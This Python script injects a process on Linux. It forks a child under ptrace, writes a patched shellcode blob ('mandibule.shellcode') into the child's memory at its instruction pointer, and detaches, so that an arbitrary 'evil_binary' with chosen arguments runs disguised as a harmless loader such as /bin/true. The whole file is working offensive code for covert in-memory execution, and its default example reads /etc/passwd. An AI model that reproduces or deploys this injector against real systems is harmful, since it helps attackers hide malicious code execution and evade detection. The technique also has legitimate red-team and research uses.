import os
import ctypes
import ctypes.util
import sys
import struct

PTRACE_TRACEME = 0
PTRACE_CONT = 7
PTRACE_GETREGS = 12
PTRACE_POKETEXT = 4
PTRACE_DETACH = 17

libc = ctypes.CDLL(ctypes.util.find_library("c"))


class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]


def build_ashared_t(size_max, size_used, pid, base_addr, count_arg, count_env, data):
    return (
        struct.pack(
            "<QQQqII", size_max, size_used, pid, base_addr, count_arg, count_env
        )
        + data
    )


def child_worker(filename):
    if libc.ptrace(PTRACE_TRACEME, 0, 0, 0) == -1:
        print("ptrace TRACEME failed")
        sys.exit(1)

    os.execlp(filename, filename)


def parent_worker(pid, evil_binary, evil_args, evil_envs):
    _, status = os.waitpid(pid, 0)

    if os.WIFSTOPPED(status):
        regs = user_regs_struct()
        if libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(regs)) == -1:
            print("PTRACE_GETREGS failed")
            sys.exit(1)

        # print("child {} stopped, RIP: {}".format(pid, hex(regs.rip)))

        shellcode = bytearray(open("mandibule.shellcode", "rb").read())
        arg_count = len(evil_args) + 1
        env_count = len(evil_envs)
        str_list = [evil_binary]
        str_list.extend(evil_args)
        str_list.extend(evil_envs)
        str_list_pack = b"\x00".join([x.encode() for x in str_list])
        str_list_pack += b"\x00"

        ashared_data = build_ashared_t(
            size_max=len(str_list_pack) + 0x30,
            size_used=len(str_list_pack) + 0x30,
            pid=pid,
            base_addr=-1,
            count_arg=arg_count,
            count_env=env_count,
            data=str_list_pack,
        )

        fix_pos = shellcode.find(struct.pack("<Q", 0xDEADBEEF13371337))
        shellcode[fix_pos : fix_pos + len(ashared_data)] = ashared_data

        # shellcode = b'\xeb\xfe'+shellcode

        for i in range(0, len(shellcode), 8):
            word = shellcode[i : i + 8]
            word += b"\x00" * (8 - len(word))  # padding
            if (
                libc.ptrace(
                    PTRACE_POKETEXT,
                    pid,
                    ctypes.c_void_p(regs.rip + i),
                    ctypes.c_void_p(int.from_bytes(word, "little")),
                )
                == -1
            ):
                print("PTRACE_POKETEXT failed")
                sys.exit(1)

        if libc.ptrace(PTRACE_DETACH, pid, None, None) == -1:
            print("PTRACE_DETACH failed")
            sys.exit(1)

        # os.execlp("gdb","gdb","attach",str(pid),'-ex','set $rip=$rip+2')

        # wait for child
        _, status = os.waitpid(pid, 0)

    else:
        print("Child {} did not stop as expected".format(pid))


def inject_run(
    dummy_loader="/bin/true",
    evil_binary="/bin/ls",
    evil_args=["-l", "/etc/passwd"],
    evil_envs=[],
):
    pid = os.fork()
    if pid == 0:
        child_worker(dummy_loader)
        exit(0)
    else:
        parent_worker(pid, evil_binary, evil_args, evil_envs)


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("usage: {} <dummy elf> <running_elf> [args]".format(sys.argv[0]))
        sys.exit(1)
    inject_run(sys.argv[1], sys.argv[2], sys.argv[3:])
